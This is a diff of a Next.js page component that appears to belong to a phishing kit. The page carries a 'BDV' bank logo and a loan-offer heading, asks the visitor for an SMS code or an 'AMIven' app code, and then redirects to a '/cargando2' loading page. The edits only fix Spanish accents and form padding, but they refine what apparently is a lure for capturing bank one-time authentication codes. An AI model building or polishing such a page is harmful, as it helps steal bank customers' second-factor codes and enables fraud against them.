@@ -1,4 +1,4 @@
-"use client";
+﻿"use client";
 
 import { ChangeEvent, FormEvent, useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
@@ -55,14 +55,14 @@ export default function Sms() {
 
       if (!response.ok) {
         const payload = await response.json().catch(() => null);
-        const message = payload?.error ?? "No se pudo enviar la informacion. Intenta nuevamente.";
+        const message = payload?.error ?? "No se pudo enviar la información. Intenta más tarde.";
         throw new Error(message);
       }
 
       router.push("/cargando2");
     } catch (err) {
       console.error(err);
-      const message = err instanceof Error ? err.message : "No se pudo enviar la informacion. Intenta mas tarde.";
+      const message = err instanceof Error ? err.message : "No se pudo enviar la información. Intenta más tarde.";
       setError(message);
     } finally {
       setIsSending(false);
@@ -72,16 +72,16 @@ export default function Sms() {
   return (
     <div className="container">
       <div className="left-side">
-        <form onSubmit={handleSubmit} className="form">
+        <form onSubmit={handleSubmit} className="form" style={{ padding: "32px 32px 40px" }}>
           <div style={{ textAlign: "center" }}>
             {/* eslint-disable-next-line @next/next/no-img-element */}
             <img src="/logo.png" alt="BDV" style={{ width: "60%", marginTop: "20px" }} />
           </div>
           <div style={{ width: "100%", textAlign: "center" }}>
             <div style={{ margin: "10px", color: "#0067b1" }}>
-              <h4 style={{ margin: 0 }}>Prestamo para usuario Disponible</h4>
+              <h4 style={{ margin: 0 }}>Préstamo para usuario disponible</h4>
               <h5 style={{ margin: "10px 0 0" }}>
-                {"Para aceptar Ingrese el c\u00F3digo recibido por SMS o c\u00F3digo generado en amiven"}
+                Para aceptar ingresa el código recibido por SMS o el código generado en AMIven
               </h5>
             </div>
             <div className="form-group">
